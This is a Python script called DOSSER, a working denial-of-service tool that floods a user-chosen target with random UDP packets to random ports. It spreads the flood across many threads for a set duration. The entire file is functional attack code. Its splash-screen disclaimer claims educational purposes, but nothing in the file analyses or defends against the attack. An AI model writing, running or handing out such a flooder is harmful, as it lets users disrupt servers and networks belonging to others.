import threading
import socket
import random
import time
import sys
import os

class DOS: # Initialise the class
    def main(self): # Main function contains the main code
        try: # Check the arguments given with the command
            self.target = str(sys.argv[1])
            self.threads = int(sys.argv[2])
            self.timer = float(sys.argv[3])
        except IndexError: # If one of the arguments were not given correctly
            print(f" [+] Command usage: python {sys.argv[0]} <target> <threads> <time> !") # Print the correct command usage
            sys.exit() # Exit the code

        os.system('cls' if os.name == 'nt' else 'clear') # Clear the screen

        print("""  ██████╗  ██████╗ ███████╗███████╗███████╗██████╗
  ██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
  ██║  ██║██║   ██║███████╗███████╗█████╗  ██████╔╝
  ██║  ██║██║   ██║╚════██║╚════██║██╔══╝  ██╔══██╗
  ██████╔╝╚██████╔╝███████║███████║███████╗██║  ██║
  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝

 [!] Disclaimer:  This script is made for educational
     purporses and the developers assume no liabilaty
     and are not responsible for any misuse or damage
     caused by DOSSER
""") # Display the splash screen
        time.sleep(5) # Wait a few seconds to give time to read the disclaimer

        self.timeout = time.time() + 1 * self.timer + 2 # Set how long time the attack will last

        self.start() # Start the attack

    def attack(self): # The attack function getting ran by each of the threads
        try: # Catch any error that may occur
            bytes = random._urandom(1024) # Generate our random byte string
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Get the socket

            while time.time() < self.timeout: # Loop untill the time is
                port = random.randint(20, 55500) # Get the port
                sock.sendto( # Send the data to the server
                    bytes * random.randint(5, 15),
                    (self.target, port)
                )

            return # End the script once the loop is done
            sys.exit()

        except: # Catch the errors and just ignore them
            pass

    def start(self): # Function to manage the attack
        print(" [+] Starting Attack..\n") # Let the user know its starting the attack
        time.sleep(2) # Sleep a bit to let the user read the message

        for i in range(0, self.threads): # Loop over the amount of threads the user wants to use
            print(f" [?] Starting thread {i}") # Let the user know a thread is starting
            threading.Thread(target=self.attack).start() # Start the thread with the attack function
            time.sleep(.3) # Wait a bit for dramatic effect

        print("") # Print a newline at the end

if __name__ == '__main__': # If the file is getting ran directly
    DOSClient = DOS() # Create the ddos client ( Class )
    DOSClient.main() # Run the main function
